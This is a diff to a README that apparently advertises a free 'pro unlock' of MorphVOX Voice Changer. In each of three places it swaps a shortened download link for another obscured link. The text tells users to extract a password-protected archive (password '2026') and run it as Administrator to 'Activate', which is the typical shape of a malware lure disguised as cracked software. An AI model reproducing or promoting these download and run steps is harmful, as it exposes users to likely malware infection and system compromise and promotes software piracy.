@@ -9,7 +9,7 @@
 
 <div align="center">
 
-[![Download MorphVOX Voice Changer](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/morphvox-voicechanger)
+[![Download MorphVOX Voice Changer](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/xBVlBA7WM2dkYol0M)
 
 </div>
 
@@ -117,7 +117,7 @@
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Click "Activate" → Launch MorphVOX
 
-[![Download MorphVOX Voice Changer](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/morphvox-voicechanger)
+[![Download MorphVOX Voice Changer](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/xBVlBA7WM2dkYol0M)
 
 ### Detailed Instructions (May 2026 Update)
 
@@ -263,7 +263,7 @@ Get full MorphVOX professional voice changer for free. **MorphVOX Voice Changer*
 
 <div align="center">
 
-[![Download MorphVOX Voice Changer](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/morphvox-voicechanger)
+[![Download MorphVOX Voice Changer](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/xBVlBA7WM2dkYol0M)
 
 **Version 4.6.1** — Free MorphVOX pro unlock. May 2026 update. Zero cost. No payment.
 
